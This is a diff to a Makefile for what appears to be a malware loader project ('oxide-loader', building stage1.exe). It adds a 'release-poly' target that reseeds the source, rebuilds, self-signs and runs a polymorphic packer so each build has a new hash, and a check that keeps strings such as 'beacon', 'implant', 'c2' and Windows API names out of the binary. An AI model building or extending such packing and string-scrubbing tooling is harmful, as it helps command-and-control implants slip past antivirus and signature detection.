@@ -66,12 +66,32 @@ MAX_SIZE := 22528
 LINUX_OUT := $(BUILD_DIR)/stage1
 WIN_OUT := $(BUILD_DIR)/stage1.exe
 
+# S35 polymorphic packer: per-build seed (override on command line).
+# Defaults to a stable value so `make release-poly` without args is
+# reproducible. Override with: `make release-poly SEED=N`.
+SEED ?= 1
+PACKER_DIR := $(realpath $(CURDIR)/../../oxide/crypter/packer)
+XS_SEED_HDR := src/xs_seed.h
+XS_SEED_EXAMPLE := src/xs_seed.h.example
+
 # Forbidden-token regex for `make verify`. Keep in sync with plan / README.
 FORBIDDEN := '(oxide|beacon|stage|implant|c2|http://|https://|User-Agent|Mozilla|VirtualAlloc|LoadLibrary|GetProcAddress|wininet|InternetOpen|kernel32|ntdll|OXID|/api/|NtAllocate|NtProtect)'
 
-.PHONY: all linux windows clean check verify s34_verify sign
+.PHONY: all linux windows clean check verify s34_verify sign release-poly xs_seed
 
 all: linux windows
+
+# Provide an xs_seed.h fallback for plain `make windows` builds. If the
+# header is missing (gitignored, regenerated only by release-poly), we
+# copy the committed zero-seed sample so MinGW has something to compile.
+$(XS_SEED_HDR):
+	@if [ ! -f $(XS_SEED_HDR) ]; then \
+		cp $(XS_SEED_EXAMPLE) $(XS_SEED_HDR); \
+		echo "[xs_seed] copied $(XS_SEED_EXAMPLE) -> $(XS_SEED_HDR) (non-poly default)"; \
+	fi
+
+# All windows builds depend on xs_seed.h existing.
+$(WIN_RES_O): $(XS_SEED_HDR)
 
 linux: $(BUILD_DIR)
 	$(CC) $(LINUX_CFLAGS) $(LINUX_SRCS) -o $(LINUX_OUT) $(LINUX_LDFLAGS)
@@ -175,3 +195,25 @@ s34_verify: $(WIN_OUT)
 # Self-sign via sign.sh (idempotent; regenerates cert only if missing).
 sign: $(WIN_OUT)
 	@./sign.sh $(WIN_OUT)
+
+# S35 release-poly: full polymorphic build pipeline.
+#   1. Regenerate src/xs_seed.h from --seed (Layer 1 source variation).
+#   2. Clean rebuild stage1.exe (Layer 1 takes effect at compile time).
+#   3. Run sign.sh to apply S34 timestamp tool + osslsigncode sign.
+#   4. Polymorph the signed output (timestamp + .text padding rewrite +
+#      checksum recompute + strip + re-sign with the SAME seed).
+# Same SEED + same toolchain -> identical SHA256.
+release-poly:
+	@if [ ! -d "$(PACKER_DIR)" ]; then \
+		echo "ERR: packer dir not found at $(PACKER_DIR). oxide repo must be a sibling of oxide-loader." >&2; \
+		exit 2; \
+	fi
+	@echo "[release-poly] seed=$(SEED) -- regenerating $(XS_SEED_HDR)"
+	@python3 $(PACKER_DIR)/xs_seed_gen.py --seed $(SEED) --out $(XS_SEED_HDR) --force
+	@$(MAKE) -s clean
+	@$(MAKE) -s windows
+	@./sign.sh $(WIN_OUT)
+	@echo "[release-poly] running pack.py post-link mutations..."
+	@python3 $(PACKER_DIR)/pack.py $(WIN_OUT) -o $(WIN_OUT) --seed $(SEED)
+	@echo "[release-poly] done. SHA256:"
+	@sha256sum $(WIN_OUT)
